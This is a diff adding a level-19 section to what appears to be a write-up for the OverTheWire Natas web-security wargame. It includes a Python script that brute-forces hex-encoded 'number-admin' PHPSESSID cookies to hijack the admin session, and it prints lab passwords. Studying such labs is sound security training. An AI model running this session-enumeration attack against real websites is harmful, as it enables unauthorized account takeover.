@@ -360,3 +360,40 @@ else:
 With this code we can find the admin `PHPSESSID`. Once we find it (in this case it's `119`), we can see the response and it shows us the password.
 
 Password: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
+
+# Level 19
+
+In this level we get a message saying the session ID is no longer sequential. But when we check the `PHPSESSID` cookie, we see some sort of hex-encoded data. When we decode that hex, we get something like this:
+
+```
+201-admin
+```
+
+So the format is `{number}-{username}` encoded as hex. We can try changing the number to find an admin session ID. For this we use this code:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
+BASE_URL = "http://natas19.natas.labs.overthewire.org/"
+MAX = 1000
+
+for x in range(1, MAX + 1):
+    tmp = f"{x}-admin"
+    sid = tmp.encode("ascii").hex()
+    print(f"Testing PHPSESSID={sid} ({tmp})")
+    cookies = {'PHPSESSID': str(sid)}
+    resp = requests.get(BASE_URL, auth=auth, cookies=cookies, verify=False)
+    
+    if "You are an admin" in resp.text:
+        print(f"\n>>> Found admin session: {sid} ({tmp})\n")
+        print(resp.text[:2000])
+        break
+else:
+    print("Admin session not found in range.")
+```
+
+When we run it, we find the password for the next level.
+
+Password: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
